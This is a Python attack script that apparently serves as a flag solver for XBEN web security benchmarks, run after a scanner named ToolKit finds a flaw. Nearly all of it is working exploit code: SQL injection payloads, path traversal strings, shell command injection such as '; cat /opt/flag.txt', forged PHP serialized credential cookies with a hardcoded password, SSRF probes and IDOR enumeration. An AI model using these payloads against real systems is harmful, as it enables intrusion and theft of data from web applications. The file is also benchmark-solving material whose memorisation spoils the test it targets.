#!/usr/bin/env python3
"""solver.py — XBEN benchmark flag solver for ToolKit findings.

After ToolKit detects a vulnerability, solver attempts to exploit it
and extract FLAG{...} or flag{...} from the response.
"""
import re, json, time
from urllib.parse import urljoin, urlencode
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None  # type: ignore


FLAG_PATTERN = re.compile(r'(?:FLAG|flag|CTF)\{[^}]{1,100}\}')
FLAG_FILE_PATTERNS = [
    "/flag.txt", "/FLAG.txt", "/opt/flag.txt", "/flag", "/FLAG",
    "/var/www/html/flag.txt", "/app/flag.txt",
]


# ────────────────────────────────────────────────────────────────
#  Base Solver
# ────────────────────────────────────────────────────────────────

class XBENSolver:
    """Attempt to extract flag from a running XBEN benchmark."""

    def __init__(self, target_url: str, verbose: bool = False):
        self.target = target_url.rstrip("/")
        self.verbose = verbose
        self.session = requests.Session() if requests else None
        self.timeout = 10

    def _log(self, msg: str):
        if self.verbose:
            print(f"    [solver] {msg}")

    def _check_flag(self, text: str) -> str | None:
        m = FLAG_PATTERN.search(text)
        if m:
            return m.group(0)
        return None

    # ────────────────────────────────────────────────────────────
    #  IDOR: enumerate IDs, check for flag in response
    # ────────────────────────────────────────────────────────────
    def solve_idor(self, endpoints: list[str] = None) -> str | None:
        self._log("IDOR solver: enumerating IDs...")
        if not endpoints:
            endpoints = ["/api/jobs", "/api/orders", "/api/users",
                         "/jobs", "/orders", "/dashboard", "/receipt",
                         "/api/v1/jobs/{id}", "/job/{id}", "/order/{id}"]

        # Try common endpoints directly
        for ep in endpoints:
            url = urljoin(self.target, ep)
            try:
                r = self.session.get(url, timeout=self.timeout)
                flag = self._check_flag(r.text)
                if flag:
                    self._log(f"✓ flag in {ep}")
                    return flag
                self._log(f"{ep} → {r.status_code} ({len(r.text)}b)")
            except Exception as e:
                self._log(f"{ep} error: {e}")

        # ID enumeration: try IDs 1-20 on common patterns
        for base in ["/api/jobs/", "/api/orders/", "/job/", "/order/",
                      "/receipt/", "/api/v1/jobs/"]:
            for uid in range(1, 21):
                try:
                    r = self.session.get(urljoin(self.target, f"{base}{uid}"),
                                         timeout=self.timeout)
                    flag = self._check_flag(r.text)
                    if flag:
                        self._log(f"✓ flag {base}{uid}")
                        return flag
                except Exception:
                    pass

        # Try admin cookies for IDOR
        for cookie_name in ["admin", "creds", "auth", "token", "session"]:
            for val in ["admin", "admin=true", "1", "true"]:
                try:
                    r = self.session.get(self.target,
                                         cookies={cookie_name: val},
                                         timeout=self.timeout)
                    flag = self._check_flag(r.text)
                    if flag:
                        self._log(f"✓ flag via cookie {cookie_name}={val}")
                        return flag
                except Exception:
                    pass
        return None

    # ────────────────────────────────────────────────────────────
    #  SQLi: basic injection to extract data
    # ────────────────────────────────────────────────────────────
    def solve_sqli(self, endpoints: list[str] = None) -> str | None:
        self._log("SQLi solver: testing injection points...")
        if not endpoints:
            endpoints = ["/api/jobs", "/api/items", "/items", "/jobs",
                         "/api/v1/jobs", "/api/search"]

        payloads = [
            ("' OR 1=1--", "get_all"),
            ("' UNION SELECT 1,2,3,4--", "union"),
            ("' UNION SELECT 1,2,3,4,5,6--", "union6"),
            ("' AND 1=1--", "true"),
            ("' AND 1=2--", "false"),
            ("1' OR '1'='1", "sqli_or"),
        ]

        for ep in endpoints:
            for param in ["id", "q", "search", "user", "name", "job"]:
                for payload, tag in payloads:
                    try:
                        url = urljoin(self.target, f"{ep}?{param}={payload}")
                        r = self.session.get(url, timeout=self.timeout)
                        flag = self._check_flag(r.text)
                        if flag:
                            self._log(f"✓ flag via {ep}?{param}={tag}")
                            return flag
                    except Exception:
                        pass
        return None

    # ────────────────────────────────────────────────────────────
    #  PHP Deserialization: craft malicious cookie
    # ────────────────────────────────────────────────────────────
    def solve_php_deser(self) -> str | None:
        self._log("PHP Deser solver: crafting auth cookie...")
        # Common known passwords from benchmarks
        passwords = [
            "kl!RtYuUUig664ds32AKA87",
            "admin123", "password", "admin", "secret",
            "kl!RtYuUUig664ds32AKA88",
        ]
        import base64 as _b64

        for pwd in passwords:
            for user in ["admin", "administrator", "root"]:
                # Standard PHP serialize format
                ser = f'a:2:{{s:8:"username";s:{len(user)}:"{user}";s:8:"password";s:{len(pwd)}:"{pwd}";}}'
                b64 = _b64.b64encode(ser.encode()).decode()
                try:
                    r = self.session.get(self.target,
                                         cookies={"creds": b64},
                                         timeout=self.timeout)
                    flag = self._check_flag(r.text)
                    if flag:
                        self._log(f"✓ flag via creds cookie (user={user})")
                        return flag
                    # Also try raw base64
                    r2 = self.session.get(self.target,
                                          cookies={"creds": ser},
                                          timeout=self.timeout)
                    flag = self._check_flag(r2.text)
                    if flag:
                        self._log("✓ flag via raw creds cookie")
                        return flag
                except Exception:
                    pass
        return None

    # ────────────────────────────────────────────────────────────
    #  LFI: path traversal to read flag file
    # ────────────────────────────────────────────────────────────
    def solve_lfi(self, endpoints: list[str] = None) -> str | None:
        self._log("LFI solver: traversing to flag files...")
        if not endpoints:
            endpoints = ["/?page=", "/?file=", "/?id=", "/?path=",
                         "/?template=", "/include.php?file=",
                         "/post.php?id=", "/index.php?page="]

        traversals = [
            "../../../../FLAG.txt",
            "../../../../flag.txt",
            "../../../../opt/flag.txt",
            "../../../../../../FLAG.txt",
            "../../../../../../flag.txt",
            "../../../../../../opt/flag.txt",
            "....//....//....//FLAG.txt",
            "....//....//....//flag.txt",
            "%2e%2e/%2e%2e/%2e%2e/FLAG.txt",
            "..\\..\\..\\..\\FLAG.txt",
        ]

        for ep in endpoints:
            for trav in traversals:
                try:
                    url = urljoin(self.target, f"{ep}{trav}")
                    r = self.session.get(url, timeout=self.timeout)
                    flag = self._check_flag(r.text)
                    if flag:
                        self._log(f"✓ flag via {ep}{trav[:20]}...")
                        return flag
                except Exception:
                    pass
        return None

    # ────────────────────────────────────────────────────────────
    #  CMDi / RCE: try command injection
    # ────────────────────────────────────────────────────────────
    def solve_cmdi(self, endpoints: list[str] = None) -> str | None:
        self._log("CMDi solver: injecting commands...")
        if not endpoints:
            endpoints = ["/?cmd=", "/?q=", "/?exec=", "/api/exec",
                         "/wp-admin/admin-post.php"]

        cmds = [
            "; cat /opt/flag.txt",
            "; cat /FLAG.txt",
            "; cat /flag.txt",
            "| cat /opt/flag.txt",
            "`cat /opt/flag.txt`",
            "$(cat /opt/flag.txt)",
            "; cat /flag*",
            "| cat /flag*",
        ]

        for ep in endpoints:
            for cmd in cmds:
                try:
                    url = urljoin(self.target, f"{ep}{cmd}")
                    r = self.session.get(url, timeout=self.timeout)
                    flag = self._check_flag(r.text)
                    if flag:
                        self._log(f"✓ flag via cmdi")
                        return flag
                except Exception:
                    pass
        return None

    # ────────────────────────────────────────────────────────────
    #  SSRF: try internal services for flag
    # ────────────────────────────────────────────────────────────
    def solve_ssrf(self, param: str = "url",
                   hint_hosts: list[str] = None) -> str | None:
        self._log("SSRF solver: probing internal services...")
        if hint_hosts is None:
            hint_hosts = ["internal-service", "internal", "web", "app",
                          "backend", "api", "db", "database", "redis",
                          "nginx", "server", "service"]

        for host in hint_hosts:
            for proto in ["http"]:
                try:
                    url = f"{self.target}?{param}={proto}://{host}/"
                    r = self.session.get(url, timeout=self.timeout)
                    flag = self._check_flag(r.text)
                    if flag:
                        self._log(f"✓ flag via ssrf {proto}://{host}")
                        return flag
                except Exception:
                    pass
        return None

    # ────────────────────────────────────────────────────────────
    #  Auto-detect and run the right solver
    # ────────────────────────────────────────────────────────────
    def solve_all(self, tags: list[str] = None,
                  page_hints: list[str] = None) -> str | None:
        """Run all relevant solvers based on tags."""
        if tags is None:
            tags = []
        if page_hints is None:
            page_hints = []

        self._log(f"solving {tags} with hints: {page_hints[:3]}...")

        # Try known flag files first (fast)
        for fp in FLAG_FILE_PATTERNS:
            try:
                r = self.session.get(urljoin(self.target, fp),
                                     timeout=self.timeout)
                flag = self._check_flag(r.text)
                if flag:
                    self._log(f"✓ flag directly at {fp}")
                    return flag
            except Exception:
                pass

        solvers = []

        if "ssrf" in tags or any("ssrf" in t.lower() for t in tags):
            solvers.append(lambda: self.solve_ssrf(
                hint_hosts=page_hints or ["internal-service"]))

        if any(t in tags for t in ["idor", "idors", "authorization"]):
            solvers.append(self.solve_idor)

        if any(t in tags for t in ["sqli", "blind_sqli", "sql"]):
            solvers.append(self.solve_sqli)

        if any(t in tags for t in ["lfi", "path_traversal", "file"]):
            solvers.append(self.solve_lfi)

        if any(t in tags for t in ["cmd", "rce", "command_injection"]):
            solvers.append(self.solve_cmdi)

        if any(t in tags for t in ["deserialization", "insecure"]):
            solvers.append(self.solve_php_deser)

        for solver_fn in solvers:
            try:
                result = solver_fn()
                if result:
                    return result
            except Exception as e:
                self._log(f"solver error: {e}")

        return None


# ────────────────────────────────────────────────────────────────
#  CLI
# ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python solver.py <target_url> [tags...]")
        sys.exit(1)

    target = sys.argv[1]
    tags = sys.argv[2:] if len(sys.argv) > 2 else []
    solver = XBENSolver(target, verbose=True)
    result = solver.solve_all(tags)
    if result:
        print(f"\n✅ FLAG: {result}")
    else:
        print("\n❌ Flag not found")
